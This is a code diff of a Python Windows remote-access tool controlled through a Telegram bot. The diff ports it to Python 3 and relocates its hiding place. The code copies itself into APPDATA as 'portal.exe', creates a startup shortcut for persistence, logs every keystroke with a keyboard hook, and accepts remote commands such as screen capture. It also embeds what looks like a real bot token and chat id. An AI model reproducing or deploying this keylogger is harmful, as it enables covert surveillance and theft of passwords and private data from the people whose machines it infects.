@@ -1,5 +1,3 @@
-#!/usr/bin/env python
-
 from PIL import ImageGrab
 from time import strftime, sleep
 from shutil import copyfile
@@ -13,44 +11,51 @@ import pyHook, pythoncom
 
 me = singleton.SingleInstance()
 
-win_folder = os.environ['WINDIR'] 
-hide_location = win_folder + '\\' + 'portal.exe'
+appdata_folder = os.environ['APPDATA'] 
+hide_location = appdata_folder + '\\' + 'portal.exe'
 target_file = startup() + '\\portal.lnk'
+
+print('Appdata folder: {}'.format(appdata_folder))
+print('Hide location: {}'.format(hide_location))
+print('Target File: {}'.format(target_file))
 
 if (argv[0]).endswith('.exe'):
 	copyfile(argv[0], hide_location)
 	shell = Dispatch('WScript.Shell')
 	shortcut = shell.CreateShortCut(target_file)
 	shortcut.Targetpath = hide_location
-	shortcut.WorkingDirectory = win_folder
+	shortcut.WorkingDirectory = appdata_folder
 	shortcut.save()
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
-log_file = win_folder + '\\keylogs.txt'	# name of log file
+log_file = appdata_folder + '\\keylogs.txt'	# name of log file
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
 
-def pressed_chars(event):	# on key pressed function
-    if event.Ascii:
-        f = open(log_file,"a")	# open log_file in append mode
-        char = chr(event.Ascii)	# insert real char in variable
-        if event.Ascii == 8:	# if char is "backspace"
-        	f.write("[BS]")
-	if event.Ascii == 9:	# if char is "tab"
-		f.write("[TAB]")
-        if event.Ascii == 13:	# if char is "backspace"
-            f.write("[ENTER]\n")
-        f.write(char)	# write every char pressed
+
+def pressed_chars(event):
+	if event.Ascii:
+		f = open(log_file, 'a')
+		char = chr(event.Ascii)
+		if event.Ascii == 8:
+			f.write('[BS]')
+		elif event.Ascii == 9:
+			f.write('[TAB]')
+		elif event.Ascii == 13:
+			f.write('[ENTER]\n')
+		f.write(char)
+		f.close()
+
 
 def handle(msg):
 	chat_id = msg['chat']['id']
 	command = msg['text']
 	print('')
 	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)
-	print command
-	print msg
+	print(command)
+	print(msg)
 
 	if checkchat_id(chat_id):
 		if command == '/capture_pc':
@@ -147,7 +152,7 @@ def handle(msg):
 
 def checkchat_id(chat_id):
 	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
-	known_ids = ['124356']
+	known_ids = ['8569428']
 	# COMMENT THE LINE 'return True'!
 	return True
 
@@ -157,10 +162,10 @@ def checkchat_id(chat_id):
 		return str(chat_id) == known_ids
 
 # REPLACE 'abcd1234' BY THE TOKEN OF THE BOT YOU GENERATED!
-bot = telepot.Bot('abcd1234')
+bot = telepot.Bot('919525291:AAEROz7_1xK69u0QIV39fYeVqT67x1Je2Ic')
 
 bot.message_loop(handle)
-print 'Listening to commands...'
+print('Listening to commands...')
 
 proc = pyHook.HookManager()
 proc.KeyDown = pressed_chars
